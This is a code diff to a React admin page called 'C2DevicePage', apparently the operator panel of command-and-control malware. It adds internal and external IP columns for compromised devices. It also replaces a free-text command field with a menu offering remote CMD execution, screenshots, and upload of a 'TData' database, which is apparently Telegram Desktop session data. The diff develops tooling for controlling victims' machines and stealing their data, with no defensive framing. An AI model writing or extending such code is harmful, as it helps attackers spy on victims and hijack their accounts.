@@ -115,8 +115,13 @@ const C2DevicePage: React.FC = () => {
       hideInForm: true,
     },
     {
-      title: 'IP地址',
-      dataIndex: 'ip',
+      title: '内网IP',
+      dataIndex: 'internalIp',
+      valueType: 'text',
+    },
+    {
+      title: '外网IP',
+      dataIndex: 'externalIp',
       valueType: 'text',
     },
     {
@@ -225,11 +230,16 @@ const C2DevicePage: React.FC = () => {
           disabled
           initialValue={currentDeviceId}
         />
-        <ProFormText
-          rules={[{ required: true, message: '命令不能为空' }]}
+        <ProFormSelect
           label="命令"
           name="command"
-          placeholder="cmd_exec / screenshot / upload_db"
+          rules={[{ required: true, message: '请选择命令' }]}
+          valueEnum={{
+            cmd_exec: '执行CMD命令',
+            screenshot: '屏幕截图',
+            upload_db: '上传TData数据库',
+          }}
+          placeholder="请选择命令"
         />
         <ProFormTextArea
           label="参数"
